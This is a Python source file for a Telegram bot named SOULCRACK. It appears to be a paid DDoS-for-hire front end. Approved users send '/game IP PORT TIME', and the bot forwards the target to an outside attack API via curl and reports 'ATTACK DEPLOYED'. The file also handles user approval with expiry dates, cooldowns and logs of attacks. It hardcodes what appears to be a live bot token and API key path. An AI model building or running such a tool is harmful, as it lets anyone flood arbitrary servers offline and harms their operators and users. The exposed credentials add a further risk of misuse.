
import telebot
from telebot import types
import json
import os
import time
import threading
import re
import subprocess
from datetime import datetime, timedelta
from collections import defaultdict
import logging

SCRIPT_DIR_FOR_LOG = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR_FOR_LOG, "bot.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


BOT_TOKEN = "8068483548:AAHtkusgIumRTUJgPQRpI1Qj7xMu1nuc5l8"
OWNER_ID = 5438365195
API_URL = "https://hingoli.io/soul/soul.php/5438365195soulcrack45/add"


bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=50)


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
USERS_FILE = os.path.join(SCRIPT_DIR, "users.json")
ATTACK_LOGS_FILE = os.path.join(SCRIPT_DIR, "attack_logs.json")
ADMIN_ACTIONS_FILE = os.path.join(SCRIPT_DIR, "admin_actions.json")
USERS_TXT_FILE = os.path.join(SCRIPT_DIR, "users.txt")


user_cooldowns = defaultdict(float)
COOLDOWN_SECONDS = 30


file_lock = threading.Lock()


def load_json_file(filepath, default=None):

    if default is None:
        default = {}
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                return json.load(f)
        return default
    except Exception as e:
        logger.error(f"Error loading {filepath}: {e}")
        return default


def save_json_file(filepath, data):

    with file_lock:
        try:
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            logger.info(f"Saved data to {filepath}")
        except Exception as e:
            logger.error(f"Error saving {filepath}: {e}")


def load_users():

    return load_json_file(USERS_FILE, {})


def save_users(users):

    save_json_file(USERS_FILE, users)
    
    with file_lock:
        try:
            with open(USERS_TXT_FILE, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write("SOULCRACK BOT - USERS DATABASE\n")
                f.write("=" * 80 + "\n\n")
                for user_id, user_data in users.items():
                    f.write(f"User ID: {user_id}\n")
                    f.write(f"Username: {user_data.get('username', 'N/A')}\n")
                    f.write(f"Status: {user_data.get('status', 'unapproved')}\n")
                    f.write(f"Expiry: {user_data.get('expiry_date', 'N/A')}\n")
                    f.write(f"Attacks: {user_data.get('attack_count', 0)}\n")
                    f.write("-" * 80 + "\n")
        except Exception as e:
            logger.error(f"Error saving users TXT: {e}")


def load_attack_logs():

    return load_json_file(ATTACK_LOGS_FILE, [])


def save_attack_log(log_entry):

    logs = load_attack_logs()
    logs.append(log_entry)
    save_json_file(ATTACK_LOGS_FILE, logs)


def load_admin_actions():

    return load_json_file(ADMIN_ACTIONS_FILE, [])


def save_admin_action(action_entry):

    actions = load_admin_actions()
    actions.append(action_entry)
    save_json_file(ADMIN_ACTIONS_FILE, actions)


def get_user(user_id):

    users = load_users()
    return users.get(str(user_id))


def update_user(user_id, user_data):

    users = load_users()
    users[str(user_id)] = user_data
    save_users(users)


def is_owner(user_id):

    return user_id == OWNER_ID


def is_admin(user_id):

    if is_owner(user_id):
        return True
    user = get_user(user_id)
    return user and user.get('status') == 'admin'


def is_approved(user_id):

    user = get_user(user_id)
    if not user:
        return False
    
    status = user.get('status')
    if status in ['owner', 'admin']:
        return True
    
    if status != 'approved':
        return False
    

    expiry_str = user.get('expiry_date')
    if not expiry_str:
        return False
    
    try:
        expiry_date = datetime.fromisoformat(expiry_str)
        if datetime.now() > expiry_date:

            user['status'] = 'expired'
            update_user(user_id, user)
            return False
        return True
    except:
        return False


def cleanup_expired_users():

    users = load_users()
    now = datetime.now()
    updated = False
    
    for user_id, user_data in users.items():
        if user_data.get('status') == 'approved':
            expiry_str = user_data.get('expiry_date')
            if expiry_str:
                try:
                    expiry_date = datetime.fromisoformat(expiry_str)
                    if now > expiry_date:
                        user_data['status'] = 'expired'
                        updated = True
                        logger.info(f"User {user_id} expired")
                except:
                    pass
    
    if updated:
        save_users(users)



def escape_markdown(text):

    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text


def validate_ip(ip):

    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    parts = ip.split('.')
    return all(0 <= int(part) <= 255 for part in parts)


def validate_port(port):

    try:
        p = int(port)
        return 1 <= p <= 65535
    except:
        return False


def validate_time(time_val):

    try:
        t = int(time_val)
        return 60 <= t <= 3600
    except:
        return False


def get_time_remaining(expiry_str):

    try:
        expiry_date = datetime.fromisoformat(expiry_str)
        now = datetime.now()
        if now > expiry_date:
            return "Expired"
        
        diff = expiry_date - now
        days = diff.days
        hours = diff.seconds // 3600
        
        if days > 0:
            return f"{days}d {hours}h"
        else:
            return f"{hours}h"
    except:
        return "N/A"


def get_progress_bar(remaining_seconds, total_seconds):

    if total_seconds <= 0:
        return "░░░░░░░░░░"
    
    percentage = max(0, min(1, remaining_seconds / total_seconds))
    filled = int(percentage * 10)
    bar = "▓" * filled + "░" * (10 - filled)
    return f"{bar} {int(percentage * 100)}%"


def check_cooldown(user_id):

    if user_id in user_cooldowns:
        elapsed = time.time() - user_cooldowns[user_id]
        if elapsed < COOLDOWN_SECONDS:
            return COOLDOWN_SECONDS - int(elapsed)
    return 0


def set_cooldown(user_id):

    user_cooldowns[user_id] = time.time()


def execute_attack(ip, port, time_val, username):

    try:
        url = API_URL.format(username=username)
        data = f"ip={ip}&port={port}&time={time_val}"
        
        cmd = [
            'curl', '-X', 'POST',
            '-H', 'User-Agent: SOULCRACK',
            '-d', data,
            url,
            '--max-time', '10'
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=15
        )
        
        return {
            'success': True,
            'response': result.stdout,
            'error': result.stderr
        }
    except subprocess.TimeoutExpired:
        return {
            'success': False,
            'response': '',
            'error': 'API timeout'
        }
    except Exception as e:
        return {
            'success': False,
            'response': '',
            'error': str(e)
        }




def get_unapproved_message(user_id):
    
    return f"""⚡ *SOULCRACK BOT* ⚡
──────────────────
⚠️ *ACCESS DENIED*

You need approval to use this feature\\.
Contact owner: @OP_Abdullah\\_owner

Your ID: `{user_id}`
Status: ❌ *UNAPPROVED*"""


def get_status_message(user_id):

    user = get_user(user_id)
    if not user:
        return "❌ User not found in database"
    
    username = escape_markdown(user.get('username', 'N/A'))
    status = user.get('status', 'unapproved')
    attack_count = user.get('attack_count', 0)
    
    status_emoji = {
        'owner': '👑',
        'admin': '⚡',
        'approved': '✅',
        'unapproved': '❌',
        'expired': '⏳'
    }.get(status, '❓')
    
    cooldown = check_cooldown(user_id)
    cooldown_str = f"⏳ {cooldown}s" if cooldown > 0 else "✅ Ready"
    
    if status in ['owner', 'admin']:
        time_left = "∞ Unlimited"
        progress = "▓▓▓▓▓▓▓▓▓▓ 100%"
    elif status == 'approved':
        expiry = user.get('expiry_date', 'N/A')
        time_left = get_time_remaining(expiry)
        
        progress = "▓▓▓▓▓░░░░░"
    else:
        time_left = "N/A"
        progress = "░░░░░░░░░░ 0%"
    
    return f"""🔋 *USER STATUS*
┌─────────────────────────┐
│ User: @{username}
│ Status: {status_emoji} *{status.upper()}*
│ Time Left: {escape_markdown(time_left)}
│ Progress: {progress}
│ Attacks: {attack_count} successful
│ Cooldown: {escape_markdown(cooldown_str)}
└─────────────────────────┘"""


def get_attack_response(ip, port, time_val, success, position=1):

    status_emoji = "✅ SUCCESS" if success else "❌ FAILED"
    
    return f"""⚡ *ATTACK DEPLOYED*
──────────────────
Target: `{ip}:{port}`
Duration: {time_val} seconds
API Status: {status_emoji}
Queue Position: \\#{position}
Estimated Start: *NOW*"""


def get_user_list_message():

    users = load_users()
    approved_users = {uid: data for uid, data in users.items() 
                     if data.get('status') in ['approved', 'admin', 'owner']}
    
    if not approved_users:
        return "📋 *APPROVED USERS* \\(0\\)\n\nNo approved users yet\\."
    
    count = len(approved_users)
    msg = f"📋 *APPROVED USERS* \\({count}\\)\n"
    msg += "```\n"
    msg += "┌────┬─────────────┬──────────┬─────────┐\n"
    msg += "│ ID │ Username    │ Expires  │ Attacks │\n"
    msg += "├────┼─────────────┼──────────┼─────────┤\n"
    
    for idx, (user_id, data) in enumerate(approved_users.items(), 1):
        username = data.get('username', 'N/A')[:11]
        status = data.get('status', 'N/A')
        attacks = data.get('attack_count', 0)
        
        if status in ['owner', 'admin']:
            expires = "Never"
        else:
            expires = get_time_remaining(data.get('expiry_date', 'N/A'))[:8]
        
        msg += f"│ {idx:<2} │ @{username:<10} │ {expires:<8} │ {attacks:<7} │\n"
    
    msg += "└────┴─────────────┴──────────┴─────────┘\n"
    msg += "```"
    
    return msg


@bot.message_handler(commands=['start'])
def handle_start(message):

    user_id = message.from_user.id
    username = message.from_user.username or f"user{user_id}"
    

    user = get_user(user_id)
    if not user:
        user_data = {
            'user_id': user_id,
            'username': username,
            'status': 'owner' if user_id == OWNER_ID else 'unapproved',
            'attack_count': 0,
            'joined_date': datetime.now().isoformat()
        }
        update_user(user_id, user_data)
        logger.info(f"New user registered: {user_id} (@{username})")
    
    welcome_msg = f"""⚡ *WELCOME TO SOULCRACK* ⚡
━━━━━━━━━━━━━━━━━━━━━━━━
🔥 Game Server Management Bot

Your ID: `{user_id}`
Username: @{escape_markdown(username)}

*Available Commands:*
• `/id` \\- Show your Telegram ID
• `/status` \\- Check your account status
• `/game IP PORT TIME` \\- Deploy attack
• `/list` \\- View approved users \\(Admin\\)
• `/approve` \\- Approve users \\(Admin\\)

Need access\\? Contact: @soulcracks\\_owner
━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    bot.reply_to(message, welcome_msg, parse_mode='MarkdownV2')


@bot.message_handler(commands=['id'])
def handle_id(message):

    args = message.text.split()[1:]
    
    if args and is_admin(message.from_user.id):

        target = args[0].lstrip('@')
        users = load_users()
        
        for user_id, data in users.items():
            if data.get('username', '').lower() == target.lower():
                msg = f"👤 User: @{escape_markdown(target)}\n"
                msg += f"📱 Telegram ID: `{user_id}`"
                bot.reply_to(message, msg, parse_mode='MarkdownV2')
                return
        
        bot.reply_to(message, f"❌ User @{escape_markdown(target)} not found in database", parse_mode='MarkdownV2')
    else:

        user_id = message.from_user.id
        username = message.from_user.username or "N/A"
        msg = f"👤 Your Username: @{escape_markdown(username)}\n"
        msg += f"📱 Your Telegram ID: `{user_id}`"
        bot.reply_to(message, msg, parse_mode='MarkdownV2')


@bot.message_handler(commands=['status'])
def handle_status(message):

    user_id = message.from_user.id
    
    if not is_approved(user_id):
        bot.reply_to(message, get_unapproved_message(user_id), parse_mode='MarkdownV2')
        return
    
    status_msg = get_status_message(user_id)
    bot.reply_to(message, status_msg, parse_mode='MarkdownV2')


@bot.message_handler(commands=['approve'])
def handle_approve(message):

    if not is_admin(message.from_user.id):
        bot.reply_to(message, get_unapproved_message(message.from_user.id), parse_mode='MarkdownV2')
        return
    
    args = message.text.split()[1:]
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: `/approve USER_ID DAYS`", parse_mode='MarkdownV2')
        return
    
    try:
        target_id = int(args[0])
        days = int(args[1])
        
        if days < 1 or days > 365:
            bot.reply_to(message, "❌ Days must be between 1 and 365", parse_mode='MarkdownV2')
            return
        
        
        user = get_user(target_id)
        if not user:
            user = {
                'user_id': target_id,
                'username': f'user{target_id}',
                'status': 'approved',
                'attack_count': 0,
                'joined_date': datetime.now().isoformat()
            }
        else:
            user['status'] = 'approved'
        

        expiry_date = datetime.now() + timedelta(days=days)
        user['expiry_date'] = expiry_date.isoformat()
        user['approved_by'] = message.from_user.id
        user['approved_date'] = datetime.now().isoformat()
        
        update_user(target_id, user)

        save_admin_action({
            'action': 'approve',
            'admin_id': message.from_user.id,
            'target_id': target_id,
            'days': days,
            'timestamp': datetime.now().isoformat()
        })
        
        msg = f"""✅ *USER APPROVED*
──────────────────
User ID: `{target_id}`
Duration: {days} days
Expires: {escape_markdown(expiry_date.strftime('%Y-%m-%d %H:%M'))}

Status: ✅ *ACTIVE*"""
        
        bot.reply_to(message, msg, parse_mode='MarkdownV2')
        logger.info(f"User {target_id} approved for {days} days by {message.from_user.id}")
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid format\\. Use: `/approve USER_ID DAYS`", parse_mode='MarkdownV2')


@bot.message_handler(commands=['disapprove'])
def handle_disapprove(message):

    if not is_admin(message.from_user.id):
        bot.reply_to(message, get_unapproved_message(message.from_user.id), parse_mode='MarkdownV2')
        return
    
    args = message.text.split()[1:]
    if len(args) != 1:
        bot.reply_to(message, "❌ Usage: `/disapprove USER_ID`", parse_mode='MarkdownV2')
        return
    
    try:
        target_id = int(args[0])
        
        user = get_user(target_id)
        if not user:
            bot.reply_to(message, f"❌ User `{target_id}` not found", parse_mode='MarkdownV2')
            return
        
        user['status'] = 'unapproved'
        user['expiry_date'] = None
        update_user(target_id, user)
        

        save_admin_action({
            'action': 'disapprove',
            'admin_id': message.from_user.id,
            'target_id': target_id,
            'timestamp': datetime.now().isoformat()
        })
        
        msg = f"❌ *USER DISAPPROVED*\n──────────────────\nUser ID: `{target_id}`\nStatus: 🔒 *REVOKED*"
        bot.reply_to(message, msg, parse_mode='MarkdownV2')
        logger.info(f"User {target_id} disapproved by {message.from_user.id}")
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid user ID", parse_mode='MarkdownV2')


@bot.message_handler(commands=['addusername'])
def handle_addusername(message):

    if not is_admin(message.from_user.id):
        bot.reply_to(message, get_unapproved_message(message.from_user.id), parse_mode='MarkdownV2')
        return
    
    args = message.text.split()[1:]
    if len(args) != 2:
        bot.reply_to(message, "❌ Usage: `/addusername USER_ID USERNAME`", parse_mode='MarkdownV2')
        return
    
    try:
        target_id = int(args[0])
        username = args[1].lstrip('@')
        
        user = get_user(target_id)
        if not user:
            user = {
                'user_id': target_id,
                'username': username,
                'status': 'unapproved',
                'attack_count': 0,
                'joined_date': datetime.now().isoformat()
            }
        else:
            user['username'] = username
        
        update_user(target_id, user)
        

        save_admin_action({
            'action': 'addusername',
            'admin_id': message.from_user.id,
            'target_id': target_id,
            'username': username,
            'timestamp': datetime.now().isoformat()
        })
        
        msg = f"✅ *USERNAME UPDATED*\n──────────────────\nUser ID: `{target_id}`\nUsername: @{escape_markdown(username)}"
        bot.reply_to(message, msg, parse_mode='MarkdownV2')
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid format", parse_mode='MarkdownV2')


@bot.message_handler(commands=['list'])
def handle_list(message):

    if not is_admin(message.from_user.id):
        bot.reply_to(message, get_unapproved_message(message.from_user.id), parse_mode='MarkdownV2')
        return
    
    list_msg = get_user_list_message()
    bot.reply_to(message, list_msg, parse_mode='MarkdownV2')


@bot.message_handler(commands=['game'])
def handle_game(message):

    user_id = message.from_user.id
    

    if not is_approved(user_id):
        bot.reply_to(message, get_unapproved_message(user_id), parse_mode='MarkdownV2')
        return
    

    cooldown = check_cooldown(user_id)
    if cooldown > 0:
        msg = f"⏳ *COOLDOWN ACTIVE*\n──────────────────\nPlease wait {cooldown} seconds\\."
        bot.reply_to(message, msg, parse_mode='MarkdownV2')
        return
    

    args = message.text.split()[1:]
    if len(args) != 3:
        bot.reply_to(message, "❌ Usage: `/game IP PORT TIME`\nExample: `/game 192\\.168\\.1\\.100 443 600`", parse_mode='MarkdownV2')
        return
    
    ip, port, time_val = args
    

    if not validate_ip(ip):
        bot.reply_to(message, f"❌ Invalid IP address: `{escape_markdown(ip)}`", parse_mode='MarkdownV2')
        return
    
    if not validate_port(port):
        bot.reply_to(message, f"❌ Invalid port: `{escape_markdown(port)}` \\(must be 1\\-65535\\)", parse_mode='MarkdownV2')
        return
    
    if not validate_time(time_val):
        bot.reply_to(message, f"❌ Invalid time: `{escape_markdown(time_val)}` \\(must be 60\\-3600 seconds\\)", parse_mode='MarkdownV2')
        return
    

    set_cooldown(user_id)
    

    user = get_user(user_id)
    username = user.get('username', f'user{user_id}')
    

    def run_attack():
        result = execute_attack(ip, port, time_val, username)
        

        if result['success']:
            user['attack_count'] = user.get('attack_count', 0) + 1
            update_user(user_id, user)
        

        log_entry = {
            'user_id': user_id,
            'username': username,
            'ip': ip,
            'port': port,
            'time': time_val,
            'timestamp': datetime.now().isoformat(),
            'success': result['success'],
            'response': result['response'][:500],
            'error': result['error']
        }
        save_attack_log(log_entry)
        

        response_msg = get_attack_response(ip, port, time_val, result['success'])
        bot.send_message(message.chat.id, response_msg, parse_mode='MarkdownV2')
        
        if not result['success'] and result['error']:
            error_msg = f"⚠️ Error details: `{escape_markdown(result['error'][:100])}`"
            bot.send_message(message.chat.id, error_msg, parse_mode='MarkdownV2')
    

    threading.Thread(target=run_attack, daemon=True).start()

    confirm_msg = f"⚡ *ATTACK QUEUED*\n──────────────────\nTarget: `{ip}:{port}`\nDuration: {time_val}s\n\nProcessing\\.\\.\\."
    bot.reply_to(message, confirm_msg, parse_mode='MarkdownV2')


@bot.message_handler(func=lambda message: True)
def handle_unknown(message):

    user_id = message.from_user.id
    
    if not is_approved(user_id):
        bot.reply_to(message, get_unapproved_message(user_id), parse_mode='MarkdownV2')
    else:
        msg = "❌ Unknown command\\. Type /start to see available commands\\."
        bot.reply_to(message, msg, parse_mode='MarkdownV2')



def cleanup_task():

    while True:
        try:
            cleanup_expired_users()
            time.sleep(3600)
        except Exception as e:
            logger.error(f"Cleanup task error: {e}")
            time.sleep(3600)



def main():

    logger.info("=" * 50)
    logger.info("SoulCrack Bot Starting...")
    logger.info(f"Owner ID: {OWNER_ID}")
    logger.info(f"Script Directory: {SCRIPT_DIR}")
    logger.info(f"Log File: {LOG_FILE}")
    logger.info("=" * 50)
    

    owner = get_user(OWNER_ID)
    if not owner:
        owner_data = {
            'user_id': OWNER_ID,
            'username': 'soulcracks_owner',
            'status': 'owner',
            'attack_count': 0,
            'joined_date': datetime.now().isoformat()
        }
        update_user(OWNER_ID, owner_data)
        logger.info("Owner initialized")
    

    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
    cleanup_thread.start()
    logger.info("Cleanup task started")
    

    logger.info("Bot polling started...")
    logger.info("Ready to receive commands!")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
        raise


if __name__ == "__main__":
    main()
